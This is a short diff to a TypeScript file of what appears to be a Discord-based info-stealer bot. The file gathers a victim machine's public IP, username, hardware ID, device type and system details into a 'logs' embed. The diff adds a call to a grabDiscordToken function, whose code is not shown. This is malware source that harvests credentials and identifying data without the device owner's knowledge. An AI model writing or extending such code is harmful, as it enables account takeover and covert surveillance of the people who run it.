@@ -6,14 +6,16 @@ import { getLocalUsername } from '@/bot/functions/check_user'
 import { getPublicIP } from '@/bot/functions/ip'
 import { getDeviceType } from '@/bot/functions/device'
 import { getHWID } from '@/bot/functions/hwid'
+import { grabDiscordToken } from '../functions/grab_token'
 
-export const createEmbed = async (client: Client): Promise<EmbedBuilder> => {
+export const createLogEmbed = async (client: Client): Promise<EmbedBuilder> => {
   const publicIp = await getPublicIP()
   const localUser = getLocalUsername()
   const hwid = await getHWID()
   const time = getFormattedTime()
   const device = getDeviceType()
   const system = getSystemInfo()
+  grabDiscordToken()
 
   const embed = new EmbedBuilder()
     .setTitle('Tempomary logs')
